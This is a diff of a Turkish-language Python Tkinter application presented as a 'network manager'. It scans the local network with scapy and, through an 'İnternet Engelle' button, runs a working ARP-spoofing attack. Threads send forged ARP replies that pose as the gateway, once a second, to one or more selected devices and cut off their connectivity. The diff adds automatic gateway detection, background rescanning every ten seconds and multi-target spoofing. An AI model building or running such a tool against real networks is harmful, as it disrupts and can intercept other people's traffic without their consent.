@@ -1,58 +1,55 @@
 import tkinter as tk
 from tkinter import ttk, messagebox
+from ttkthemes import ThemedTk  # Modern görünüm için
 import scapy.all as scapy
 from scapy.layers.l2 import ARP
 from threading import Thread
 import time
+from tkinter import font  # Font eklemek için
 
 # Özel temalar ve renkler
 DARK_BG = "#1e1e1e"
 DARKER_BG = "#121212"
-ACCENT_COLOR = "#007acc"  # Mavi aksan rengi
-TEXT_COLOR = "#e0e0e0"
-RED_ACCENT = "#ff5252"
-GREEN_ACCENT = "#4caf50"
+ACCENT_COLOR = "#00bcd4"
+HOVER_COLOR = "#0097a7"
+TEXT_COLOR = "#ffffff"
 
-# Tema sınıfı
-class DarkTheme:
+# Modern stil oluşturma
+class ModernTheme:
     def __init__(self, root):
-        # Ana stil dosyası
         self.style = ttk.Style()
-        self.style.theme_use('clam')
-        
-        # Arkaplan ve yazı renkleri
+        self.style.theme_use("clam")
         root.configure(bg=DARK_BG)
-        self.style.configure('TFrame', background=DARK_BG)
-        self.style.configure('TLabel', background=DARK_BG, foreground=TEXT_COLOR)
-        self.style.configure('TButton', background=ACCENT_COLOR, foreground=TEXT_COLOR)
-        
-        # Treeview stilleri
-        self.style.configure("Treeview", 
-                        background=DARKER_BG, 
-                        foreground=TEXT_COLOR, 
-                        fieldbackground=DARKER_BG, 
-                        borderwidth=0)
-        self.style.map('Treeview', 
-                  background=[('selected', ACCENT_COLOR)],
-                  foreground=[('selected', TEXT_COLOR)])
-        
-        # Scrollbar
-        self.style.configure("Vertical.TScrollbar", 
-                        background=DARKER_BG, 
-                        bordercolor=DARKER_BG, 
-                        arrowcolor=TEXT_COLOR,
-                        troughcolor=DARK_BG)
+        self.style.configure("TButton",
+                             background=ACCENT_COLOR,
+                             foreground=TEXT_COLOR,
+                             font=("Roboto", 12, "bold"),  # Fontu buraya ekliyoruz
+                             borderwidth=0,
+                             padding=6)
+        self.style.map("TButton",
+                       background=[("active", HOVER_COLOR)])
+        self.style.configure("TEntry",
+                             fieldbackground=DARKER_BG,
+                             foreground=TEXT_COLOR,
+                             padding=5,
+                             insertcolor=TEXT_COLOR,
+                             font=("Roboto", 11))  # Font burada da kullanılıyor
+        self.style.configure("Treeview",
+                             background=DARK_BG,
+                             foreground=TEXT_COLOR,
+                             fieldbackground=DARK_BG,
+                             borderwidth=0)
+        self.style.map("Treeview",
+                       background=[("selected", ACCENT_COLOR)],
+                       foreground=[("selected", TEXT_COLOR)])
 
 # Ağ tarama fonksiyonu
 def scan_network(ip_range):
-    arp_request = scapy.ARP(pdst=ip_range)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast / arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-
     devices = []
+    answered_list = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip_range), timeout=1, verbose=False)[0]
     for element in answered_list:
-        devices.append({'ip': element[1].psrc, 'mac': element[1].hwsrc})
+        if element[1].psrc not in [device["ip"] for device in devices]:  # Duplicate kontrolü
+            devices.append({'ip': element[1].psrc, 'mac': element[1].hwsrc})
     return devices
 
 # MAC Adres Alma
@@ -64,285 +61,170 @@ def get_mac(ip):
         answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
         return answered_list[0][1].hwsrc
     except Exception as e:
-        print(f"[-] MAC adresi alınamadı ({ip}): {e}")
-        messagebox.showerror("Hata", f"MAC adresi alınamadı: {e}")
+        messagebox.showerror("Hata", f"MAC adresi alınamadı ({ip}): {e}")
         return None
 
-# Özel widget sınıfları
-class CustomButton(tk.Button):
-    def __init__(self, master=None, **kwargs):
-        bg_color = kwargs.pop('bg', ACCENT_COLOR)
-        fg_color = kwargs.pop('fg', TEXT_COLOR)
-        kwargs['bg'] = bg_color
-        kwargs['fg'] = fg_color
-        kwargs['activebackground'] = bg_color
-        kwargs['activeforeground'] = fg_color
-        kwargs['relief'] = tk.FLAT
-        kwargs['borderwidth'] = 0
-        kwargs['padx'] = 15
-        kwargs['pady'] = 8
-        kwargs['font'] = ('Segoe UI', 10)
-        super().__init__(master, **kwargs)
-        
-        # Hover efekti
-        self.bind("<Enter>", self.on_enter)
-        self.bind("<Leave>", self.on_leave)
-        
-    def on_enter(self, e):
-        orig_color = self['bg']
-        # Biraz daha açık renk
-        r, g, b = self.master.winfo_rgb(orig_color)
-        r = min(65535, int(r * 1.1))
-        g = min(65535, int(g * 1.1))
-        b = min(65535, int(b * 1.1))
-        hover_color = f'#{r//256:02x}{g//256:02x}{b//256:02x}'
-        self['bg'] = hover_color
-        
-    def on_leave(self, e):
-        self['bg'] = ACCENT_COLOR if self['bg'] != RED_ACCENT else RED_ACCENT
-
-class LabeledEntry(tk.Frame):
-    def __init__(self, master=None, label_text="", default_value="", **kwargs):
-        kwargs['bg'] = DARK_BG
-        super().__init__(master, **kwargs)
-        
-        self.label = tk.Label(self, text=label_text, bg=DARK_BG, fg=TEXT_COLOR, font=('Segoe UI', 10))
-        self.label.pack(side="left")
-        
-        self.var = tk.StringVar(value=default_value)
-        self.entry = tk.Entry(self, textvariable=self.var, width=20, bg=DARKER_BG, fg=TEXT_COLOR, 
-                             insertbackground=TEXT_COLOR, relief=tk.FLAT, bd=0, 
-                             selectbackground=ACCENT_COLOR, font=('Segoe UI', 10))
-        self.entry.pack(side="left", padx=5, ipady=5, pady=2)
-        
-        # Border için çerçeve
-        self.border_frame = tk.Frame(self, height=2, bg=ACCENT_COLOR)
-        self.border_frame.pack(fill="x", side="bottom")
+# Kullanıcı ağ geçidini otomatik algılayabilir
+def detect_gateway():
+    try:
+        result = scapy.conf.route.route("0.0.0.0")[2]
+        return result
+    except Exception as e:
+        messagebox.showerror("Hata", f"Ağ geçidi algılanamadı: {e}")
+        return "192.168.1.1"
 
 # GUI Başlangıç
-class NetworkManagerApp(tk.Tk):
+class NetworkManagerApp(ThemedTk):
     def __init__(self):
-        super().__init__()
+        super().__init__(theme="arc")  # Modern bir tema
         self.title("Ağ Yöneticisi")
-        self.geometry("660x650")
-        self.resizable(True, True)
-        self.minsize(660, 500)
-        
-        # Tema uygula
-        self.theme = DarkTheme(self)
+        self.geometry("680x650")
+        self.minsize(680, 500)
         self.configure(bg=DARK_BG)
-        
-        # Icon ve başlık çubuğu
-        #self.iconbitmap('network.ico') if hasattr(self, 'iconbitmap') else None
-        
-        # Cihaz listesi
+        self.theme = ModernTheme(self)
         self.devices = []
-        self.selected_device = None
+        self.selected_devices = []
         self.active_threads = []
-        self.stop_flag = False  # İşlemi durdurmak için bayrak
-
-        # Arayüz Elemanları
+        self.stop_flag = False
+        self.gateway_ip = detect_gateway()  # Otomatik ağ geçidi algılama
         self.create_widgets()
-        
-        # Gateway IP
-        self.gateway_ip = "192.168.1.1"  # Varsayılan gateway
+        self.scan_network_background()  # Otomatik tarama başlatılır
+
+        # Sürükleme işlevselliği ekleme
+        self.is_dragging = False
+        self.offset_x = 0
+        self.offset_y = 0
+        self.bind("<ButtonPress-1>", self.on_drag_start)
+        self.bind("<B1-Motion>", self.on_drag_motion)
+
+        # Pencereyi boyutlandırmayı engelleme
+        self.resizable(False, False)  # Boyutlandırmayı engelle
+
+        # Başlık çubuğunu bırakıyoruz
+        self.protocol("WM_DELETE_WINDOW", self.on_closing)  # Pencereyi kapatma butonuna tıklayınca yapılacak işlemi belirliyoruz
+
+    def on_drag_start(self, event):
+        """Sürükleme başlatma pozisyonunu kaydet."""
+        self.is_dragging = True
+        self.offset_x = event.x
+        self.offset_y = event.y
+
+    def on_drag_motion(self, event):
+        """Pencereyi sürüklerken konumunu değiştirir."""
+        if self.is_dragging:
+            delta_x = event.x - self.offset_x
+            delta_y = event.y - self.offset_y
+            new_x = self.winfo_x() + delta_x
+            new_y = self.winfo_y() + delta_y
+            self.geometry(f"+{new_x}+{new_y}")
+
+    def on_closing(self):
+        """Pencereyi kapatma işlevini engellemek için."""
+        self.destroy()  # Kapanmayı engellemek yerine doğrudan pencereyi kapatıyoruz
 
     def create_widgets(self):
-        # Ana çerçeve
         self.main_frame = tk.Frame(self, bg=DARK_BG)
         self.main_frame.pack(fill="both", expand=True, padx=20, pady=20)
-        
+
         # Başlık
-        title_frame = tk.Frame(self.main_frame, bg=DARK_BG)
-        title_frame.pack(fill="x", pady=(0, 15))
-        
-        title_label = tk.Label(title_frame, text="AĞ YÖNETİCİSİ", bg=DARK_BG, fg=ACCENT_COLOR, 
-                              font=("Segoe UI", 18, "bold"))
-        title_label.pack()
-        
-        subtitle_label = tk.Label(title_frame, text="Ağ İzleme ve Kontrol Aracı", bg=DARK_BG, fg=TEXT_COLOR, 
-                                 font=("Segoe UI", 10))
-        subtitle_label.pack()
-        
-        # Üst kısım - Ayarlar
-        settings_frame = tk.Frame(self.main_frame, bg=DARK_BG)
-        settings_frame.pack(fill="x", pady=10)
-        
-        # Sol ve sağ çerçevelere böl
-        left_settings = tk.Frame(settings_frame, bg=DARK_BG)
-        left_settings.pack(side="left", fill="x", expand=True)
-        
-        right_settings = tk.Frame(settings_frame, bg=DARK_BG)
-        right_settings.pack(side="right")
-        
-        # Ağ Aralığı
-        self.ip_entry = LabeledEntry(left_settings, label_text="Ağ Aralığı:", default_value="192.168.1.0/24")
-        self.ip_entry.pack(side="left", padx=(0, 20))
-        self.ip_range_var = self.ip_entry.var
-        
-        # Gateway IP
-        self.gateway_entry = LabeledEntry(left_settings, label_text="Gateway IP:", default_value="192.168.1.1")
-        self.gateway_entry.pack(side="left")
-        self.gateway_var = self.gateway_entry.var
-        
-        # Ağ Taraması Butonu
-        self.scan_btn = CustomButton(right_settings, text="🔍 Ağ Taraması Yap", command=self.scan_network)
-        self.scan_btn.pack(side="right", padx=5)
-        
-        # Cihaz Listesi Çerçevesi
-        list_frame = tk.Frame(self.main_frame, bg=DARKER_BG, bd=1, relief=tk.FLAT)
-        list_frame.pack(fill="both", expand=True, pady=15)
-        
-        # Liste Başlığı
-        list_header = tk.Frame(list_frame, bg=DARKER_BG, height=30)
-        list_header.pack(fill="x")
-        
-        tk.Label(list_header, text="Bulunan Cihazlar", bg=DARKER_BG, fg=TEXT_COLOR, 
-                font=("Segoe UI", 11, "bold")).pack(pady=5)
-        
-        # Cihaz Listesi İçeriği
-        list_content = tk.Frame(list_frame, bg=DARKER_BG)
-        list_content.pack(fill="both", expand=True, padx=2, pady=2)
-        
-        # Treeview ve Scrollbar içeren çerçeve
-        tree_frame = tk.Frame(list_content, bg=DARKER_BG)
-        tree_frame.pack(fill="both", expand=True)
-        
+        title_label = tk.Label(self.main_frame, text="AĞ YÖNETİCİSİ", bg=DARK_BG, fg=ACCENT_COLOR, font=("Roboto", 20, "bold"))  # Font burada
+        title_label.pack(pady=(0, 15))
+
+        # IP Giriş Alanı
+        self.ip_entry = ttk.Entry(self.main_frame)
+        self.ip_entry.insert(0, "192.168.1.0/24")
+        self.ip_entry.pack(pady=5)
+
+        # Ağ Tarama Butonu
+        scan_button = ttk.Button(self.main_frame, text="🔍 Ağ Taraması Yap", command=self.manual_scan)
+        scan_button.pack(pady=10)
+
         # Cihaz Listesi
-        self.device_list = ttk.Treeview(tree_frame, columns=("IP", "MAC"), show="headings", style="Treeview")
+        self.device_list = ttk.Treeview(self.main_frame, columns=("IP", "MAC"), show="headings", height=15, selectmode="extended")
         self.device_list.heading("IP", text="IP Adresi")
         self.device_list.heading("MAC", text="MAC Adresi")
-        self.device_list.column("IP", width=150, anchor=tk.CENTER)
-        self.device_list.column("MAC", width=200, anchor=tk.CENTER)
-        self.device_list.pack(side="left", fill="both", expand=True)
-        
-        # Scrollbar
-        self.scrollbar = ttk.Scrollbar(tree_frame, orient="vertical", command=self.device_list.yview, style="Vertical.TScrollbar")
-        self.scrollbar.pack(side="right", fill="y")
-        self.device_list.configure(yscrollcommand=self.scrollbar.set)
-        
+        self.device_list.pack(fill="both", expand=True, pady=15)
         self.device_list.bind("<<TreeviewSelect>>", self.on_device_select)
-        
-        # Alt Kontrol Paneli
-        control_panel = tk.Frame(self.main_frame, bg=DARK_BG, height=80)
-        control_panel.pack(fill="x", pady=15)
-        
-        # İşlem Seçenekleri
-        self.action_frame = tk.Frame(control_panel, bg=DARK_BG)
-        self.action_frame.pack()
-        
-        # Bilgi etiketi
-        self.info_label = tk.Label(self.action_frame, text="Bir cihaz seçin ve işlem yapın", 
-                                  bg=DARK_BG, fg=TEXT_COLOR, font=("Segoe UI", 10))
-        self.info_label.pack(side="top", pady=(0, 10))
 
         # Butonlar
-        self.buttons_frame = tk.Frame(self.action_frame, bg=DARK_BG)
-        self.buttons_frame.pack()
-        
-        self.engelle_btn = CustomButton(self.buttons_frame, text="🔒 İnternet Engelle", 
-                                      command=self.block_internet)
-        self.engelle_btn.pack(side="left", padx=10)
-        
-        self.stop_btn = CustomButton(self.buttons_frame, text="⛔ İşlemi Durdur", 
-                                   command=self.stop_all_threads, bg=RED_ACCENT)
-        self.stop_btn.pack(side="left", padx=10)
-        
-        # Durum çubuğu
-        status_frame = tk.Frame(self, bg=DARKER_BG, height=25)
-        status_frame.pack(side="bottom", fill="x")
-        
-        self.status_var = tk.StringVar(value="✓ Hazır")
-        self.status_bar = tk.Label(status_frame, textvariable=self.status_var, 
-                                 bg=DARKER_BG, fg=TEXT_COLOR, anchor=tk.W, padx=10, pady=3)
-        self.status_bar.pack(fill="x")
+        button_frame = tk.Frame(self.main_frame, bg=DARK_BG)
+        button_frame.pack(pady=10)
 
-    def scan_network(self):
-        ip_range = self.ip_range_var.get()
-        self.gateway_ip = self.gateway_var.get()
-        
-        self.status_var.set(f"🔍 Ağ taranıyor: {ip_range}")
-        self.update_idletasks()
-        
-        try:
-            # Tarama butonu devre dışı bırak
-            self.scan_btn.config(state="disabled", text="Taranıyor...")
-            self.update_idletasks()
-            
-            self.devices = scan_network(ip_range)
+        block_button = ttk.Button(button_frame, text="🔒 İnternet Engelle", command=self.block_internet)
+        block_button.grid(row=0, column=0, padx=10)
 
-            # Listeyi güncelle
-            for item in self.device_list.get_children():
-                self.device_list.delete(item)
-            
-            if not self.devices:
-                self.status_var.set("⚠ Cihaz bulunamadı!")
-                self.info_label.config(text="Cihaz bulunamadı. Farklı bir ağ aralığı deneyin.")
-            else:
-                for device in self.devices:
-                    self.device_list.insert("", "end", values=(device["ip"], device["mac"]))
-                    
-                self.status_var.set(f"✓ {len(self.devices)} cihaz bulundu")
-                self.info_label.config(text="Bir cihaz seçin ve işlem yapın")
-                
-            # Tarama butonu normal hale getir
-            self.scan_btn.config(state="normal", text="🔍 Ağ Taraması Yap")
-            
-        except Exception as e:
-            self.scan_btn.config(state="normal", text="🔍 Ağ Taraması Yap")
-            messagebox.showerror("Hata", f"Ağ tarama hatası: {e}")
-            self.status_var.set("❌ Tarama başarısız")
+        stop_button = ttk.Button(button_frame, text="⛔ İşlemi Durdur", command=self.stop_all_threads)
+        stop_button.grid(row=0, column=1, padx=10)
 
-    def on_device_select(self, event):
-        selected_items = self.device_list.selection()
-        if selected_items:
-            selected_item = selected_items[0]
-            self.selected_device = self.device_list.item(selected_item, "values")
-            self.info_label.config(text=f"Seçili Cihaz: {self.selected_device[0]}")
+        # Durum Çubuğu
+        self.status_label = tk.Label(self.main_frame, text="Hazır", bg=DARK_BG, fg=TEXT_COLOR, anchor="w")
+        self.status_label.pack(fill="x", padx=10, pady=5)
 
-    def block_internet(self):
-        if not self.selected_device:
-            messagebox.showerror("Hata", "Bir cihaz seçin!")
-            return
+    def manual_scan(self):
+        """Manuel ağ taraması yapar ve listeyi günceller."""
+        self.scan_network_update_list()
+        messagebox.showinfo("Ağ Tarama", "Manuel ağ taraması tamamlandı!")
 
-        target_ip = self.selected_device[0]
-        gateway_ip = self.gateway_ip
+    def scan_network_update_list(self):
+        """Ağı tarar ve yalnızca yeni cihazları listeye ekler."""
+        ip_range = self.ip_entry.get()
+        devices = scan_network(ip_range)
+        existing_ips = {self.device_list.item(child)["values"][0] for child in self.device_list.get_children()}
+        for device in devices:
+            if device["ip"] not in existing_ips:
+                self.device_list.insert("", "end", values=(device["ip"], device["mac"]))
 
-        # Tüm mevcut işlemleri durdur
-        self.stop_all_threads()
+    def scan_network_background(self):
+        """Otomatik ağ taraması için bir iş parçacığı."""
+        def background_task():
+            while not self.stop_flag:
+                self.scan_network_update_list()
+                time.sleep(10)  # Her 10 saniyede bir ağ taraması
+            print("Otomatik tarama durduruldu.")
 
-        # Yeni thread başlat
-        self.stop_flag = False  # Yeni işlem için bayrağı sıfırla
-        thread = Thread(target=self.arp_spoof, args=(target_ip, gateway_ip))
+        thread = Thread(target=background_task)
         thread.daemon = True
         thread.start()
         self.active_threads.append(thread)
 
-        self.status_var.set(f"🔒 {target_ip} cihazının interneti engellendi")
-        self.info_label.config(text=f"{target_ip} cihazı engellendi. İşlem aktif.", fg=GREEN_ACCENT)
-        messagebox.showinfo("Başarılı", f"{target_ip} cihazının interneti engellendi.")
+    def on_device_select(self, event):
+        selected_items = self.device_list.selection()
+        self.selected_devices = [self.device_list.item(item, "values") for item in selected_items]
+
+    def block_internet(self):
+        if not self.selected_devices:
+            messagebox.showerror("Hata", "En az bir cihaz seçin!")
+            return
+        if not messagebox.askyesno("Uyarı", "Bu işlem diğer cihazları etkileyebilir. Devam etmek istiyor musunuz?"):
+            return
+        self.stop_flag = False
+        for device in self.selected_devices:
+            target_ip = device[0]
+            thread = Thread(target=self.arp_spoof, args=(target_ip, self.gateway_ip))
+            thread.daemon = True
+            thread.start()
+            self.active_threads.append(thread)
+        messagebox.showinfo("İnternet Engelle", f"{len(self.selected_devices)} cihaz için internet engelleme işlemi başlatıldı!")
 
     def arp_spoof(self, target_ip, gateway_ip):
         try:
             target_mac = get_mac(target_ip)
             gateway_mac = get_mac(gateway_ip)
-
             packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
-            print(f"[+] {target_ip} için ARP spoofing başlatıldı...")
-
-            while not self.stop_flag:  # stop_flag kontrolü
+            while not self.stop_flag:
                 scapy.send(packet, verbose=False)
-                time.sleep(1)  # Her saniye bir ARP paketi gönder
+                time.sleep(1)
         except Exception as e:
             print(f"[-] ARP Spoofing hatası: {e}")
 
     def stop_all_threads(self):
-        self.stop_flag = True  # stop_flag'i True yap
-        self.status_var.set("⛔ İşlem durduruldu")
-        self.info_label.config(text="Tüm işlemler durduruldu. Yeni işlem seçebilirsiniz.", fg=TEXT_COLOR)
-        messagebox.showinfo("Bilgi", "Tüm aktif işlemler durduruldu.")
+        self.stop_flag = True
+        for thread in self.active_threads:
+            if thread.is_alive():
+                thread.join(timeout=1)
+        self.active_threads.clear()
+        messagebox.showinfo("İşlem Durdur", "Tüm işlemler durduruldu!")
 
-# Programı Başlat
 if __name__ == "__main__":
     app = NetworkManagerApp()
     app.mainloop()
